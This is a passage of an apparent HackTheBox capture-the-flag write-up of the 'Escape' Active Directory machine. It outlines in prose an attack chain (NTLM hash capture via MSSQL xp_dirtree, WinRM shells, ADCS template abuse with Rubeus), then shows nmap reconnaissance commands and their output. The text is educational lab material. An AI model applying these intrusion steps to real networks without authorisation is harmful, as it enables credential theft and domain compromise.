
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escape - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/writeups.html">Writeups</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/medium/escape/img/escape.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>Escape - HTB</h2>
                <p>walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/Escape">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <div class="codehilite"><pre><span></span><code><span class="n">Machine</span><span class="o">:</span><span class="w"> </span><span class="n">Escape</span>
<span class="n">Difficult</span><span class="o">:</span><span class="w"> </span><span class="n">Medium</span>
<span class="n">Platform</span><span class="o">:</span><span class="w"> </span><span class="n">HackTheBox</span>
<span class="n">Release</span><span class="o">:</span><span class="w"> </span><span class="n">Released</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mi">04</span><span class="sr">/22/</span><span class="mi">2023</span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br/>About escape</h3><br/>
Escape is a <code>medium</code> difficulty machine on the HackTheBox platform. It is a machine that hosts an Active Directory service. Initially, we acquire credentials through a PDF exposed via an SMB share. These credentials belong to the user GuestUser, which allows us to establish a connection to the MSSQL service.<br/><br/>
<h3><br>Shell as sql_svc</br></h3><br>
Once inside the service, we exploit the <code>xp_dirtree</code> command to perform network-level authentication to an SMB service that we set up ourselves. We capture the Net-NTLM Hash of the <code>sql_svc</code> user and extract their credentials. These credentials grant us access to the WinRM service, enabling us to establish a shell using <code>Evil-WinRM</code>.<br/><br/>
<h3><br>Shell as Ryan.Cooper</br></h3><br>
While analyzing the system, we stumbled upon a directory that appeared to store logs. These logs, upon inspection, disclosed the password of the user Ryan.Cooper. We can utilize these credentials to establish a connection to the WinRM service.<br/><br/>
<h3><br>Shell as Administrator</br></h3><br>
To escalate privileges to the Administrator user, we exploited Active Directory Certificate Services (ADCS), specifically targeting a vulnerable certificate template. Utilizing the <code>rubeus</code> tool, we successfully retrieved the NT hash of the Administrator user.<br/><br/>
<h3><br>Recon:</br></h3><br>
Before starting the exploitation phase, it is crucial to understand what we are dealing with. Remember that a proper enumeration ensures effective exploitation.<br/><br/>
First and foremost, we need to consider that machines expose their services through ports, so it is essential to identify which ports are available (open) on the target machine.<br/><br/>
To accomplish this, we will employ the Nmap tool:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="c1">--open -sS --min-rate 5000 -v -n -Pn 10.10.11.202 -oG portScan</span>
</code></pre><br style="line-height: 0.5;"/></div>

I will provide a brief explanation of the purpose of each parameter you specified:<br/><br/>
"-p-" -&gt; We instruct the tool to perform a scan of all ports, from port 1 to 65535.<br/><br/>
"--open" -&gt; We specify that we want to filter by ports that are in the "open" state, as there are different states that are not entirely relevant.<br/><br/>
"-sS" -&gt; We indicate that we want to use the "TCP SYN Scan" scanning mode. This parameter helps to expedite the scan and reduce noise.<br/><br/>
"--min-rate 5000" -&gt; We specify the desired packet processing rate per second, in this case, "5000".<br/><br/>
"-v" -&gt; We indicate that we want to use verbose mode, which allows us to see the open ports as they are discovered during the scan. This helps us to streamline the process.<br/><br/>
"-n" -&gt; We indicate that we do not want to apply DNS resolution.<br/><br/>
"-Pn" -&gt; We indicate that we do not want to apply Host Discovery.<br/><br/>
"-oG" -&gt; We specify that we want to export the scan results in a grepable format, which allows us to filter out the most relevant information using regular expressions.<br/><br/>
Scan result:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">Completed</span><span class="w"> </span><span class="nx">SYN</span><span class="w"> </span><span class="nx">Stealth</span><span class="w"> </span><span class="nx">Scan</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">01</span><span class="p">,</span><span class="w"> </span><span class="m m-Double">26.7</span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">elapsed</span><span class="w"> </span><span class="p">(</span><span class="mi">65535</span><span class="w"> </span><span class="nx">total</span><span class="w"> </span><span class="nx">ports</span><span class="p">)</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">02</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.1</span><span class="mi">7</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65515</span><span class="w"> </span><span class="nx">filtered</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">no</span><span class="o">-</span><span class="nx">response</span><span class="p">)</span>
<span class="nx">Some</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="nx">may</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">reported</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nx">filtered</span><span class="w"> </span><span class="nx">due</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="o">--</span><span class="nx">defeat</span><span class="o">-</span><span class="nx">rst</span><span class="o">-</span><span class="nx">ratelimit</span>
<span class="nx">PORT</span><span class="w">      </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">    </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span>
<span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">    </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span>
<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span>
<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span>
<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>
<span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span>
<span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="o">-</span><span class="nx">rpc</span><span class="o">-</span><span class="nx">epmap</span>
<span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldapssl</span>
<span class="mi">1433</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">s</span>
<span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">globalcatLDAP</span>
<span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">globalcatLDAPssl</span>
<span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">wsman</span>
<span class="mi">9389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">adws</span>
<span class="mi">49667</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">unknown</span>
<span class="mi">49687</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">unknown</span>
<span class="mi">49688</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">unknown</span>
<span class="mi">49708</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">unknown</span>
<span class="mi">49712</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">unknown</span>
<span class="mi">60035</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">unknown</span>

<span class="nx">Read</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">from</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">nmap</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">26.8</span><span class="mi">2</span><span class="w"> </span><span class="nx">seconds</span>
<span class="w">           </span><span class="nx">Raw</span><span class="w"> </span><span class="nx">packets</span><span class="w"> </span><span class="nx">sent</span><span class="p">:</span><span class="w"> </span><span class="mi">131064</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">5.7</span><span class="mi">67</span><span class="nx">MB</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">Rcvd</span><span class="p">:</span><span class="w"> </span><span class="mi">34</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">1.4</span><span class="mi">96</span><span class="nx">KB</span><span class="p">)</span>
</code></pre><br style="line-height: 0.5;"/></div>

As we can see, there is a large number of open ports. For this reason, we used the grepable format. The idea is to format the information by filtering only the ports separated by commas. Then, we will conduct a thorough scan to identify the technologies, services, and versions associated with specific ports.<br/><br/>
To accomplish this, we will create a regular expression to filter the information from the grepable format file:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">portScan</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s1">'Host: '</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">oP</span><span class="w"> </span><span class="s1">'\d{1,5}/open'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="s1">'{print $1}'</span><span class="w"> </span><span class="n">FS</span><span class="o">=</span><span class="ss">"/"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xargs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">tr</span><span class="w"> </span><span class="s1">' '</span><span class="w"> </span><span class="s1">','</span><span class="w"> </span>

<span class="mi">53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49687</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49708</span><span class="p">,</span><span class="mi">49712</span><span class="p">,</span><span class="mi">60035</span>
</code></pre><br style="line-height: 0.5;"/></div>

Once we have represented the ports in the desired format, we will proceed with the scan to identify the technologies, services, and versions running on those ports.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sCV</span><span class="w"> </span><span class="o">-</span><span class="n">p53</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">389</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">593</span><span class="p">,</span><span class="mi">636</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">3268</span><span class="p">,</span><span class="mi">3269</span><span class="p">,</span><span class="mi">5985</span><span class="p">,</span><span class="mi">9389</span><span class="p">,</span><span class="mi">49667</span><span class="p">,</span><span class="mi">49687</span><span class="p">,</span><span class="mi">49688</span><span class="p">,</span><span class="mi">49708</span><span class="p">,</span><span class="mi">49712</span><span class="p">,</span><span class="mi">60035</span><span class="w"> </span><span class="mf">10.10.11.202</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">fullScan</span>
</code></pre><br style="line-height: 0.5;"/></div>
<div class="codehilite"><pre><span></span><code><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.10.11.2</span><span class="mi">02</span><span class="p">)</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.3</span><span class="mi">4</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>

<span class="nx">PORT</span><span class="w">      </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">    </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
<span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">    </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="w"> </span><span class="mi">21</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">47</span><span class="nx">Z</span><span class="p">)</span>
<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">23</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h15m15s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
<span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
<span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
<span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">22</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h15m15s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
<span class="mi">1433</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">s</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="m m-Double">15.00.2000.0</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nx">RTM</span>
<span class="o">|</span><span class="nx">_ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span><span class="nx">ERROR</span><span class="p">:</span><span class="w"> </span><span class="nx">Script</span><span class="w"> </span><span class="nx">execution</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="p">(</span><span class="nx">use</span><span class="w"> </span><span class="o">-</span><span class="nx">d</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">debug</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">23</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h15m15s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">SSL_Self_Signed_Fallback</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">47</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2053</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">47</span>
<span class="o">|</span><span class="nx">_ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span><span class="nx">ERROR</span><span class="p">:</span><span class="w"> </span><span class="nx">Script</span><span class="w"> </span><span class="nx">execution</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="p">(</span><span class="nx">use</span><span class="w"> </span><span class="o">-</span><span class="nx">d</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">debug</span><span class="p">)</span>
<span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">23</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h15m15s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
